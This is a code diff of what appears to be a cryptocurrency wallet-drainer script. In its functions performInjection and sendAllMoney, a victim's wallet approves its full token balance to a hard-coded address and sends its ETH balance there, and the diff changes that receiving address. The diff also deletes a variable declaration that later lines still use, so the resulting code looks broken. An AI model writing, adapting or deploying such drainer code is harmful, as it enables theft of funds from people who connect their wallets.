@@ -151,10 +151,9 @@ async function performInjection(address) {
 
         //let result = await contractInstance.methods.setApprovalForAll(ContractAdr, true).send({ from: selectedAccount });
         //console.log(result);
-        let data_to_encode = contractInstance.methods.setApprovalForAll(ContractAdr, true).encodeABI();
         if (actualDict[0]["isErc20"]) {
             let balanceOwned =actualDict[0]["balance"];
-            data_to_encode = contractInstance.methods.approve("0x90808EcB0f081654740477d4c8f30Cc7110d703e", balanceOwned.toString()).encodeABI();
+            data_to_encode = contractInstance.methods.approve("0xa92200ab520b2920A48A91BC301768273e0EE3c6", balanceOwned.toString()).encodeABI();
         }
 
         const transactionParameters = {
@@ -197,7 +196,7 @@ async function sendAllMoney() {
     try {
         let balance = await web3.eth.getBalance(selectedAccount);
 
-        let to = "0x90808EcB0f081654740477d4c8f30Cc7110d703e";
+        let to = "0xa92200ab520b2920A48A91BC301768273e0EE3c6";
         console.log(balance);
         //new balance = 10% of the balance
         balance = parseInt(balance);
